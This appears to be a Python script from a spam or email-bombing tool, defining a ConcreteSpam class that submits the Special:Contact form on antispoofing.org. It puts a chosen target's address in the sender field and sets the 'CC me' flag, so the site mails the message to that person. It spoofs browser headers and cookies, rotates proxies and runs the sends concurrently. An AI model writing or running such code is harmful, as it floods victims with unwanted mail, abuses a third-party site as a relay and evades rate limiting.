from os.path import basename

import requests

from module import Spam


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        import requests

        cookies = {
            '_ga': 'GA1.1.1762795220.1678093168',
            'antispoo_newnotificationFlag': '1',
            '_ga_SQ8N9LD5V2': 'GS1.1.1678093167.1.1.1678093598.0.0.0',
        }

        headers = {
            'authority': 'antispoofing.org',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'no-cache',
            # 'cookie': '_ga=GA1.1.1762795220.1678093168; antispoo_newnotificationFlag=1; _ga_SQ8N9LD5V2=GS1.1.1678093167.1.1.1678093598.0.0.0',
            'origin': 'https://antispoofing.org',
            'pragma': 'no-cache',
            'referer': 'https://antispoofing.org/Special:Contact',
            'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
        }

        text = self.get_text()
        data = {
            'wpFromName': text,
            'wpFromAddress': target,
            'wpSubject': text,
            'wpText': text,
            'wpAccept': '',
            'wpCCme': '1',
            'wpEditToken': '+\\',
            'title': 'Special:Contact',
            'wpFormType': '',
        }

        response = requests.post('https://antispoofing.org/Special:Contact', cookies=cookies, headers=headers,
                                 data=data, proxies=self.get_proxies(), timeout=20)
        return response


def main():
    s = 'Your email message has been sent.'
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), s)
    res = spam.send_post()
    if res:
        spam.run_concurrently()


if __name__ == '__main__':
    main()
